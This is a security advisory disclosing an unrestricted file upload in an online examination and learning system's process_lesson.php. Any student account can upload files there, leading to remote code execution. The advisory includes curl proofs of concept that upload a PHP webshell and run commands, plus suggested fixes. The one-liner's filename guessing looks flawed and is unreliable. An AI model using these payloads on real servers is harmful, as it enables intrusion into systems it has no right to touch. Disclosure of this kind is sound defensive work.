# Online Examination & Learning Management System /process_lesson.php Unrestricted File Upload → Remote Code Execution

## NAME OF AFFECTED PRODUCT(S)

Online Examination & Learning Management System

### Vendor Homepage

https://www.sourcecodester.com/download-code?nid=18739&title=Onlne+Examination+%26+Learning+Management+System+using+PHP+and+MySQL

## AFFECTED VERSION(S)

### Vulnerable File

`/process_lesson.php`

### VERSION(S)

latest

## PROBLEM TYPE

### Vulnerability Type

Unrestricted File Upload → Remote Code Execution

### Root Cause

The `process_lesson.php` handler accepts file uploads from any authenticated user via `$_FILES['lesson_files']`. The file extension is extracted directly from the user-supplied filename using `pathinfo($file_name, PATHINFO_EXTENSION)` and preserved in the destination path. No extension whitelist, MIME type verification, or file content inspection is performed.

The authorization check at line 4 only verifies that `$_SESSION['user_id']` is set — it does not inspect `$_SESSION['role']`. This means a `student` account (the lowest privilege level, self-registerable) can upload arbitrary files.

The web server (Apache 2.4.52) runs PHP via `mod_php`. The `uploads/lessons/` directory resides within the web root with no `.htaccess` restricting PHP execution. `AllowOverride` is `None` globally.

```php
// process_lesson.php line 4 — authorization check
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['user_id'])) {
    // Only verifies session exists. No role enforcement. Student passes.

// process_lesson.php line 23-26 — file handling
$file_name = $_FILES['lesson_files']['name'][$key];           // user-supplied
$file_path = $upload_dir . time() . '_' . $file_name;         // raw concatenation
$file_type = pathinfo($file_name, PATHINFO_EXTENSION);        // extension preserved

if (move_uploaded_file($tmp_name, $file_path)) {               // no whitelist
    $stmt->execute([$subject_id, $instructor_id, $lesson_title, $file_name, $file_path, $file_type]);
}
```

### Impact

A remote attacker with a `student` account can upload a PHP webshell and execute arbitrary commands on the server with `www-data` privileges.

## DESCRIPTION

A critical unrestricted file upload vulnerability exists in the lesson creation handler. The `/process_lesson.php` endpoint accepts multipart file uploads with no extension whitelist and insufficient authorization controls. Since the `student` role is the default self-registerable role, any remote user can obtain credentials and exploit this vulnerability within minutes.

**A student account (self-registerable) is sufficient to exploit this vulnerability.**

## Vulnerability details and POC

### Vulnerability Endpoint

`POST /process_lesson.php`

### Attack Prerequisites

- Any valid user session (student or above)
- Student accounts can be registered via `/auth.php` without approval

### PoC 1: Login + Upload PHP Webshell as Student

```bash
# Step 1: Login as student, store session cookie
curl -c /tmp/cookie -b /tmp/cookie \
  -X POST "http://TARGET/cictportal/auth_process.php" \
  -d "email=student@example.com&password=studentpass&login_btn=1"

# Step 2: Create PHP webshell payload
echo '<?php system($_GET["x"]); ?>' > /tmp/backdoor.php

# Step 3: Upload webshell via process_lesson.php
curl -b /tmp/cookie \
  -X POST "http://TARGET/cictportal/process_lesson.php" \
  -F "subject_id=11" \
  -F "lesson_title=test" \
  -F "lesson_files[]=@/tmp/backdoor.php;filename=backdoor.php"
```

**Response**: HTTP 302 → `manage_classes.php?status=lesson_deployed`

### PoC 2: Execute Arbitrary Commands

```bash
curl "http://TARGET/cictportal/uploads/lessons/<timestamp>_backdoor.php?x=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### PoC 3: One-Liner Full Exploit Chain

```bash
curl -c /tmp/c -b /tmp/c -s \
  -X POST "http://TARGET/cictportal/auth_process.php" \
  -d "email=student@example.com&password=studentpass&login_btn=1" -o /dev/null && \
echo '<?php system($_GET["x"]); ?>' > /tmp/s.php && \
curl -s -b /tmp/c \
  -X POST "http://TARGET/cictportal/process_lesson.php" \
  -F "subject_id=11" \
  -F "lesson_title=x" \
  -F "lesson_files[]=@/tmp/s.php;filename=s.php" -o /dev/null && \
echo "--- RCE OUTPUT ---" && \
curl -s "http://TARGET/cictportal/uploads/lessons/$(date +%s | tr -d '\n'; sleep 2; ls -t /tmp/s.php >/dev/null)_s.php?x=id"
```

## Suggested repair

1. **Add extension whitelist**:

```php
$allowed = ['pdf', 'doc', 'docx', 'ppt', 'pptx', 'xls', 'xlsx', 'csv', 'jpg', 'png'];
$ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    continue; // skip this file
}
```

2. **Add role enforcement**:

```php
if (!isset($_SESSION['role']) || !in_array($_SESSION['role'], ['instructor', 'super_admin'])) {
    http_response_code(403);
    exit();
}
```

3. **Disable PHP execution in upload directories** — place `.htaccess` with `php_flag engine off`, or move uploads outside the web root and serve files through a PHP proxy script.

4. **Store files with non-executable extension**: Always append `.bin` or use a hash-based filename with no extension.

5. **Implement CSRF protection**: Add per-session tokens to all state-changing POST requests.

## Reproduction Evidence

<img width="1018" height="241" alt="image" src="https://github.com/user-attachments/assets/5d308df8-56b2-48d1-b58b-9de315edaece" />

